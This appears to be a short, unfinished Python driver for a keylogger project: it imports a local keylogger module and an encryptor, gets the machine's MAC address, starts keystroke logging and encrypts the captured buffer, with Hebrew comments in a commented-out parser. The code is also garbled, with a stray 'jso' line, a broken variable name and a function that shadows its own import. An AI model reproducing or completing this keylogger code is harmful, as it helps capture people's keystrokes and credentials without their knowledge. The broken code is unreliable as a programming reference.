import keylloger
import Encryptor_
import uuid


FILEֹ_NAME = "12.34.56.78"
ENCRYPTOR = Encryptor_.Encryptor("896")

def find_MC():
    mac_num = uuid.getnode()
    mac = ':'.join([f'{(mac_num >> i) & 0xff:02x}' for i in range(40, -1, -8)])
    return mac

jso

        
# def create_dict(buffer):
#     # אנחנו רוצים להפוך את כל מה שבקובץ טקסט שנשלח אלינו למילון ולחלק את המפתחות לשעה ולטקסט עצמו
#     file = f
#     my_dict = {"time":file[11:19], "date":file[:10], "text":file[19:]}
#     return my_dict

def do_encryption(buffer):
    return ENCRYPTOR.encrypt(buffer)


def do_decrypt(buffer):
    return ENCRYPTOR.decrypt(buffer)

def meneger(self):
    keylloger = keylloger.Keylogger(interval = 10, report_method="file")
    return keylloger.start()

    
if __name__ == "__main__":
    buffer = keylloger.start()
    buffer = do_encryption(buffer)
